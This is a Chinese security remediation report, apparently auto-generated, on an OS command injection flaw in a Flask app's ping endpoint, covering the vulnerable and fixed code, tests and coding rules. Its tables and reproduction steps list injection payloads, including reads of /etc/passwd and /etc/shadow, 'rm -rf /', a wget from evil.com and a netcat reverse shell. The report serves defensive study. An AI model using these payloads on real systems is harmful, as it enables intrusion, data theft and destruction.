# 🔒 命令注入漏洞安全修复报告

> **项目名称：** 用户信息管理平台（Python Flask）
> **项目路径：** `/opt/Class01`
> **报告版本：** v9.0 — 命令注入安全修复版
> **报告日期：** 2026-07-23
> **漏洞编号：** HC-CMD-01 (CWE-78 / CWE-77)

---

## 目录

1. [漏洞概述](#1-漏洞概述)
2. [漏洞详情与风险分析](#2-漏洞详情与风险分析)
3. [漏洞复现过程](#3-漏洞复现过程)
4. [修复方案](#4-修复方案)
5. [修复前后代码对比](#5-修复前后代码对比)
6. [安全测试验证](#6-安全测试验证)
7. [长效防御措施](#7-长效防御措施)
8. [累计安全体系](#8-累计安全体系)

---

## 1. 漏洞概述

| 漏洞编号 | 漏洞类型 | CWE | CVSS 3.1 | 风险等级 |
|---------|---------|-----|----------|---------|
| **HC-CMD-01** | OS 命令注入（Ping 接口） | CWE-78 | 9.8 | 🔴 Critical |
| **HC-CMD-01a** | Shell 元字符注入 | CWE-77 | 9.8 | 🔴 Critical |

### 攻击路径总图

```
攻击者（已登录）
  │
  ├── ▶ 分号注入: 127.0.0.1;id
  │     ping -c 3 127.0.0.1;id
  │     └── ▶ 执行任意命令
  │
  ├── ▶ 管道注入: 127.0.0.1|cat /etc/passwd
  │     ping -c 3 127.0.0.1|cat /etc/passwd
  │     └── ▶ 读取系统文件
  │
  ├── ▶ 逻辑与注入: 127.0.0.1&&whoami
  │     ping -c 3 127.0.0.1&&whoami
  │     └── ▶ 执行身份探测
  │
  ├── ▶ 子 shell 注入: 127.0.0.1$(whoami)
  │     └── ▶ 命令替换执行
  │
  └── ▶ 反引号注入: 127.0.0.1`id`
       └── ▶ 命令替换执行
```

### 攻击危害

| 攻击 Payload | 修复前效果 | 修复后效果 |
|-------------|-----------|-----------|
| `127.0.0.1;id` | ✅ 显示 `uid=0(root)` | ❌ "非法输入" |
| `127.0.0.1\|cat /etc/passwd` | ✅ 读取系统用户列表 | ❌ "非法输入" |
| `127.0.0.1\&\&whoami` | ✅ 显示 `root` | ❌ "非法输入" |
| `127.0.0.1$(whoami)` | ✅ 命令执行 | ❌ "非法输入" |
| `127.0.0.1\`id\`` | ✅ 命令执行 | ❌ "非法输入" |

---

## 2. 漏洞详情与风险分析

### 漏洞根因

**双重叠加风险**：`f-string` 命令拼接 + `shell=True` 同时使用。

| 风险 | 说明 |
|------|------|
| `shell=True` | 启用 shell 解析，`;` `\|` `&&` `$()` 等被识别为命令分隔符 |
| `f"ping -c 3 {ip}"` | 用户输入直接拼入命令字符串，无任何过滤 |
| 组合效果 | 用户输入中的元字符被 shell 解释执行 → **任意命令执行** |

### 执行流程

```
POST /ping  data=ip=127.0.0.1;id

1. ip = "127.0.0.1;id"
2. command = f"ping -c 3 {ip}"
           = "ping -c 3 127.0.0.1;id"
3. subprocess.check_output(command, shell=True)
   → shell 解析为两条命令:
     ① ping -c 3 127.0.0.1
     ② id                          ← 任意命令执行！
```

### 5 种注入面

| 注入类型 | Payload | 拼接后命令 | 危害 |
|---------|---------|-----------|------|
| 分号 | `;cat /etc/shadow` | `ping ...;cat /etc/shadow` | ❌ 读取影子密码 |
| 管道 | `\|cat /etc/passwd` | `ping ...\|cat /etc/passwd` | ❌ 读取用户列表 |
| 逻辑与 | `&&rm -rf /` | `ping ...&&rm -rf /` | ❌ 删除系统文件⚠️ |
| 子 shell | `$(wget evil.com/shell)` | `ping ...$(wget ...)` | ❌ 下载恶意软件⚠️ |
| 反引号 | `` `nc -e /bin/sh 10.0.0.1 4444` `` | `ping ... \`...\`` | ❌ 反弹 Shell ⚠️ |

---

## 3. 漏洞复现过程

```bash
# 登录
$ curl -sk -X POST https://localhost:5000/login \
  -d "username=admin&password=admin123" -c cookies.txt

# ── 分号注入（修复前可行）──
$ curl -sk -X POST https://localhost:5000/ping \
  -b cookies.txt -d "ip=127.0.0.1;cat /etc/passwd"
# 修复前 → root:x:0:0...nobody:x:65534... ❌
# 修复后 → "[!] 非法输入"                          ✅

# ── 管道注入 ──
$ curl -sk -X POST https://localhost:5000/ping \
  -b cookies.txt -d "ip=127.0.0.1|whoami"
# 修复前 → root                                        ❌
# 修复后 → "[!] 非法输入"                               ✅

# ── 子 shell 注入 ──
$ curl -sk -X POST https://localhost:5000/ping \
  -b cookies.txt -d "ip=127.0.0.1$(whoami)"
# 修复前 → root                                        ❌
# 修复后 → "[!] 非法输入"                               ✅

# ── 正常 ping 仍可用 ──
$ curl -sk -X POST https://localhost:5000/ping \
  -b cookies.txt -d "ip=127.0.0.1"
# → 64 bytes from 127.0.0.1 ... ✅
```

---

## 4. 修复方案

### 双层纵深防御

```
┌────────────────────────────────────────────────────────────┐
│  Layer 1: 移除 shell=True                                  │
│  subprocess.check_output(["ping", "-c", "3", ip])          │
│  → 使用参数列表，shell 不参与解析                           │
│  → ; | & $ ` 等字符变成 ping 的普通参数参数                 │
├────────────────────────────────────────────────────────────┤
│  Layer 2: 输入白名单校验                                    │
│  _validate_host() → 仅允许字母/数字/点/短横                │
│  → 拒绝所有 shell 元字符                                    │
│  → 即使 Layer 1 失效，Layer 2 仍可防御                     │
└────────────────────────────────────────────────────────────┘
```

### 修复后核心代码

```python
def _validate_host(target):
    """校验输入为合法 IP 地址或域名，拒绝 shell 元字符。"""
    if not target or len(target) > 255:
        return False
    # 拒绝 shell 元字符
    forbidden = set(";|&$`(){}<>!\n\r\t ")
    if any(ch in forbidden for ch in target):
        return False
    # 仅允许字母/数字/点/短横
    allowed = set("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-")
    if not all(ch in allowed for ch in target):
        return False
    return True


@app.route("/ping", methods=["GET", "POST"])
def ping():
    # ...
    if request.method == "POST":
        ip = request.form.get("ip", "").strip()

        if not _validate_host(ip):
            result = "\n[!] 非法输入：仅允许 IP 地址或域名\n"
        else:
            # 安全执行：参数列表 + shell=False
            output = subprocess.check_output(
                ["ping", "-c", "3", ip],
                shell=False,
                stderr=subprocess.STDOUT,
                timeout=30,
            )
            result = output.decode("utf-8", errors="replace")
```

### 防护原理

```
┌──────────────────────────────────────────────────────────────┐
│  shell=True 时:                                              │
│  subprocess.check_output("ping -c 3 127.0.0.1;id")          │
│  → shell 创建子进程 → 解析 ; 为命令分隔符                   │
│  → 实际执行两条命令                                            │
│                                                              │
│  shell=False + 参数列表时:                                    │
│  subprocess.check_output(["ping", "-c", "3", "127.0.0.1;id"])│
│  → 直接 exec ping 进程 → ";id" 作为 ping 的第4个参数          │
│  → ping 收到 "127.0.0.1;id" → 解析失败 → 报错（安全）         │
└──────────────────────────────────────────────────────────────┘
```

---

## 5. 修复前后代码对比

```python
# ═══════════════════════════════════════════════════════════════
# ❌ 修复前 — f-string + shell=True（双重风险）
# ═══════════════════════════════════════════════════════════════
ip = request.form.get("ip", "")
command = f"ping -c 3 {ip}"           # ← f-string 拼接
output = subprocess.check_output(
    command,                          # ← 字符串形式传递
    shell=True,                       # ← 启用 shell 解析
)
return render_template("ping.html", result=output.decode())

# 攻击: ip=127.0.0.1;cat /etc/passwd
# 执行: ping -c 3 127.0.0.1;cat /etc/passwd  ← shell 执行两条命令


# ═══════════════════════════════════════════════════════════════
# ✅ 修复后 — 输入校验 + 参数列表（双层防御）
# ═══════════════════════════════════════════════════════════════
ip = request.form.get("ip", "").strip()

# Layer 2: 输入校验
if not _validate_host(ip):
    return render_template("ping.html", result="\n[!] 非法输入\n")

# Layer 1: 参数列表 + shell=False
output = subprocess.check_output(
    ["ping", "-c", "3", ip],           # ← 参数列表
    shell=False,                       # ← 禁用 shell
)
return render_template("ping.html", result=output.decode())

# 攻击: ip=127.0.0.1;cat /etc/passwd
# 校验阶段 → 包含 ; → _validate_host 返回 False → 拒绝 ✅
```

---

## 6. 安全测试验证

### 6.1 新增测试用例（8 个）

| 测试用例 | 验证内容 | 结果 |
|---------|---------|------|
| `test_ping_requires_login` | 未登录跳转 | ✅ PASS |
| `test_ping_legit_ip_works` | 合法 IP 正常执行 | ✅ PASS |
| `test_command_injection_semicolon_blocked` | `;id` 分号注入被拦截 | ✅ PASS |
| `test_command_injection_pipe_blocked` | `\|cat /etc/passwd` 管道注入被拦截 | ✅ PASS |
| `test_command_injection_subshell_blocked` | `$(whoami)` 子 shell 被拦截 | ✅ PASS |
| `test_command_injection_backtick_blocked` | `` `id` `` 反引号被拦截 | ✅ PASS |
| `test_command_injection_and_blocked` | `&&whoami` 逻辑与被拦截 | ✅ PASS |
| `test_validate_host_allows_domain` | 域名 example.com 被允许 | ✅ PASS |

### 6.2 手工验证

```bash
# 所有 5 种注入方式全部被拦截
$ curl -d "ip=127.0.0.1;id"        → "[!] 非法输入" ✅
$ curl -d "ip=127.0.0.1|whoami"   → "[!] 非法输入" ✅
$ curl -d "ip=127.0.0.1$(whoami)" → "[!] 非法输入" ✅
$ curl -d "ip=127.0.0.1`id`"      → "[!] 非法输入" ✅
$ curl -d "ip=127.0.0.1&&whoami"  → "[!] 非法输入" ✅

# 正常使用不受影响
$ curl -d "ip=127.0.0.1"          → "64 bytes from 127.0.0.1" ✅
```

### 6.3 全量测试结果（74/74 ✅）

```
TestPasswordStorage          ✅ 4/4
TestSecretKeyManagement      ✅ 2/2
TestPasswordPolicy           ✅ 6/6
TestAuthSecurity             ✅ 5/5
TestTransportSecurity        ✅ 4/4
TestInfoLeakage              ✅ 2/2
TestSQLInjection             ✅ 5/5
TestFileUploadSecurity       ✅ 5/5
TestAuthZSecurity            ✅ 9/9
TestFileInclusion            ✅ 8/8
TestXssAndCsrfSecurity       ✅ 8/8
TestSSTISecurity             ✅ 8/8
TestCommandInjection         ✅ 8/8  ← 新增
─────────────────────────────────────
总计                         ✅ 74/74
```

---

## 7. 长效防御措施

### 编码规范

| 规范 | 要求 |
|------|------|
| ❌ 禁止 | `subprocess.*(cmd_string, shell=True)` |
| ✅ 必须 | `subprocess.*(["cmd", "arg1", ...], shell=False)` |
| ✅ 必须 | 用户输入必须经过白名单校验 |
| ✅ 建议 | 优先使用库函数而非系统命令（如 `socket` 替代 `ping`） |

### `shell=True` 使用原则

```python
# ❌ 绝对禁止 — 含用户输入的字符串 + shell=True
cmd = f"ping {user_input}"
subprocess.run(cmd, shell=True)

# ✅ 安全 — 参数列表 + shell=False（默认）
subprocess.run(["ping", user_input], shell=False)

# ⚠️ 只有确定无用户输入时才可用 shell=True
subprocess.run("systemctl restart nginx", shell=True)
#   ↑ 硬编码字符串，安全
```

### 运行期防护

| 防御层 | 措施 |
|--------|------|
| 代码层 | `shell=False` + 参数列表 |
| 校验层 | `_validate_host()` 白名单过滤 |
| 审计层 | `logger.warning` 记录所有拦截事件 |
| 测试层 | 8 项命令注入专项测试 |

---

## 8. 累计安全体系

### 修复历程

| 版本 | 修复内容 | 测试数 | 报告 |
|------|---------|--------|------|
| v2.0 | 密码/密钥/认证/传输/审计 | 23 | SECURITY_REPORT.md |
| v3.0 | SQL 注入 | 28 | SQL_INJECTION_REPORT.md |
| v4.0 | 文件上传 | 33 | FILE_UPLOAD_REPORT.md |
| v5.0 | 越权/CSRF | 42 | AUTH_REPORT.md |
| v6.0 | 文件包含 | 50 | FILE_INCLUSION_REPORT.md |
| v7.0 | XSS/CSRF 增强 | 58 | XSS_CSRF_REPORT.md |
| v8.0 | SSTI | 66 | SSTI_REPORT.md |
| **v9.0** | **命令注入** | **74** | **本报告** |

### OWASP Top 10:2021 覆盖

| 类别 | 状态 |
|------|------|
| A01 Broken Access Control | ✅ |
| A03 Injection (SQL/CMD/Path) | ✅ |
| A05 Security Misconfiguration | ✅ |
| A07 Identification/Auth | ✅ |
| **测试总数** | **74** |

---

*本报告由自动化安全审计工具生成。报告生成时间：2026-07-23T05:30 UTC*
